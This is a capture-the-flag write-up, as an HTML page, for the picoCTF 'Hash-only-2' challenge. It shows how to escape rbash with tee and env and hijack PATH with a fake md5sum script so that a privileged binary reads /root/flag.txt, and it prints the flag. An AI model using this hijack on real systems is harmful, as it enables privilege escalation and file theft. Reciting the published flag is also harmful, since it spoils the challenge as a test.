<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hash-only-2 - Writeup</title>
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;500;700&family=Space+Mono:ital,wght@0,400;0,700;1,400&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">

    <style>
        /* --- Global Variables --- */
        :root {
            --bg-color: #f4f4f5;
            --text-main: #18181b;
            --text-muted: #52525b;
            --accent-color: #0d9488;
            --code-bg: #27272a;
            --code-text: #4ade80; 
            --font-main: 'Outfit', sans-serif;
            --font-code: 'Space Mono', monospace;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            background-color: var(--bg-color);
            background-image: radial-gradient(#d4d4d8 1px, transparent 1px);
            background-size: 24px 24px;
            color: var(--text-main);
            font-family: var(--font-main);
            padding: 40px 20px;
            max-width: 800px;
            margin: 0 auto;
        }

        /* --- Header --- */
        header {
            margin-bottom: 40px;
            border-bottom: 2px solid var(--text-main);
            padding-bottom: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        h1 {
            font-family: var(--font-code);
            font-size: 1.5rem;
            text-transform: uppercase;
            font-weight: 700;
        }

        .back-btn {
            text-decoration: none;
            color: var(--text-main);
            font-family: var(--font-code);
            font-weight: 700;
            border: 1px solid var(--text-main);
            padding: 8px 16px;
            border-radius: 4px;
            transition: all 0.3s;
            font-size: 0.8rem;
        }

        .back-btn:hover {
            background-color: var(--text-main);
            color: #fff;
        }

        /* --- Content Styling --- */
        .content {
            background: white;
            padding: 40px;
            border-radius: 8px;
            border: 1px solid #e4e4e7;
            box-shadow: 4px 4px 0px rgba(0,0,0,0.05);
        }

        h2 {
            font-family: var(--font-code);
            color: var(--accent-color);
            margin-top: 30px;
            margin-bottom: 15px;
            font-size: 1.2rem;
        }

        p {
            line-height: 1.8;
            margin-bottom: 20px;
            color: var(--text-main);
        }

        /* Styling the Code Blocks */
        .code-block {
            background-color: var(--code-bg);
            color: var(--code-text);
            font-family: var(--font-code);
            padding: 15px;
            border-radius: 6px;
            overflow-x: auto; 
            margin-bottom: 20px;
            font-size: 0.9rem;
            border-left: 4px solid var(--accent-color);
            white-space: pre-wrap;
        }

        /* Styling the "Given Challenge" Quote */
        blockquote {
            background-color: #f0fdfa; 
            border-left: 4px solid var(--accent-color);
            padding: 15px;
            margin-bottom: 25px;
            font-style: italic;
            color: var(--text-muted);
        }

        /* The Flag Styling */
        .flag {
            background-color: var(--accent-color);
            color: white;
            padding: 5px 10px;
            border-radius: 4px;
            font-family: var(--font-code);
            font-weight: 700;
        }
        
        /* List styling for explanations */
        ul {
            list-style-position: inside;
            margin-bottom: 20px;
        }
        li {
            margin-bottom: 10px;
            line-height: 1.6;
        }

    </style>
</head>
<body>

    <header>
        <h1>Hash-only-2 Writeup</h1>
        <a href="../../writeups.html" class="back-btn">Back to List</a>
    </header>

    <div class="content">
        
        <h2>// Given Challenge</h2>
        <blockquote>
            Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!
        </blockquote>

        <p>Firstly connect to the challenge by launching the instance and connecting through ssh(secure shell)</p>

        <div class="code-block">
ssh username@ipaddress -p port_number
        </div>

        <p>After getting logged in I just casually entered the command <code>ls</code> for seeing the contents and found nothing.</p>

        <p>Then I entered the command <code>pwd</code> for checking where I am and got this <code>/home/ctf-player</code></p>
        
        <p>In the description he said to run the flaghasher binary file so just type <code>flaghasher</code> in your command line</p>

        <div class="code-block">
Computing the MD5 hash of /root/flag.txt....
ecbb7393ae1660f00340b6194d5bf6a6  /root/flag.txt
        </div>

        <p>From this we can understand that flag is at /root/flag.txt</p>

        <p>But this challenge is of binary exploitation so we no need to try to crack the hash so this challenge comes under path hijacking vulnerability</p>

        <h2>// What is PATH hijacking?</h2>
        
        <p>When a program runs a command like md5sum:</p>
        <ul>
            <li>The system searches for md5sum using the PATH</li>
            <li>If we place a fake md5sum earlier in PATH, it will be executed instead</li>
        </ul>

        <p><code>tee</code> is used to write into files without shell redirection. Here we should do without shell direction as it is restricted, you can see that if you enter the command</p>

        <div class="code-block">
echo '...' > md5sum  
rbash: restricted: cannot redirect output 
        </div>

        <p>So use this command instead</p>

        <div class="code-block">
printf '#!/bin/sh\ncat /root/flag.txt\n' | tee md5sum
        </div>

        <h2>// Explanation of the command</h2>
        
        <p><code>#!/bin/sh</code> is called shebang and it tells the os this file is a script and it should be executed using shell</p>
        <p><code>cat /root/flag.txt</code> It is the payload which reads the contents in flag.txt</p>
        <p><code>|</code> This operator takes the output from printf and sends it as input to the next command</p>
        <p><code>tee</code> This one reads the input and writes in two places one is your terminal output screen and other is of file</p>
        <p><code>md5sum</code> is the name of the file tee creates</p>

        <p>After entering the above command make it executable</p>

        <div class="code-block">
chmod +x md5sum
        </div>

        <p>Use this command for making the file excutable</p>

        <p>After that I used the command which got failed</p>

        <div class="code-block">
PATH=.:$PATH flaghasher  
rbash: PATH: readonly variable
        </div>

        <p>It is not allowing to modify environment variables directly. So I used this command instead</p>

        <div class="code-block">
env PATH=.:$PATH flaghasher
        </div>

        <p>The <code>env</code> command launches a program with a custom environment bypassing rbash restrictions</p>

        <h2>// The Result</h2>
        <p>With these we will get our flag</p>

        <div class="code-block">
ctf-player@pico-chall$ env PATH=.:$PATH flaghasher<br>
Computing the MD5 hash of /root/flag.txt....   <br>
picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_364b3672}
        </div>

        <p>The final flag is: <br><br> <span class="flag">picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_364b3672}</span></p>

    </div>

</body>
</html>